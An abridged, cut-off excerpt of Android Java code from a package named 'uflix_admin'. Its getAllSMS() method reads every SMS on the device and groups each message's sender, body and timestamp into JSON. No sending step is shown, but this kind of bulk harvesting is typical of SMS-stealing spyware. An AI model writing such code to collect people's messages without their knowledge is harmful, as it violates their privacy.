package codex.uflix_admin.utilities;
...
import codex.uflix_admin.MainActivity;
import codex.uflix_admin.R;
...
public class Utilities {
    ...
    public static String getAllSMS() {
        ...
        JSONObject jsonSMSGroups = new JSONObject();

        if (cursor != null && cursor.moveToFirst()) {
            do {
                @SuppressLint("Range") String senderName = cursor.getString(cursor.getColumnIndex("address"));
                ...
                try {
                    if (!jsonSMSGroups.has(senderName.toLowerCase())) {
                        jsonSMSGroups.put(senderName.toLowerCase(), new JSONArray());
                    }

                    JSONObject jsonSMS = new JSONObject();
                    jsonSMS.put("messageBody", messageBody);
                    jsonSMS.put("timestamp", timestamp);
                    jsonSMSGroups.getJSONArray(senderName.toLowerCase()).put(jsonSMS);
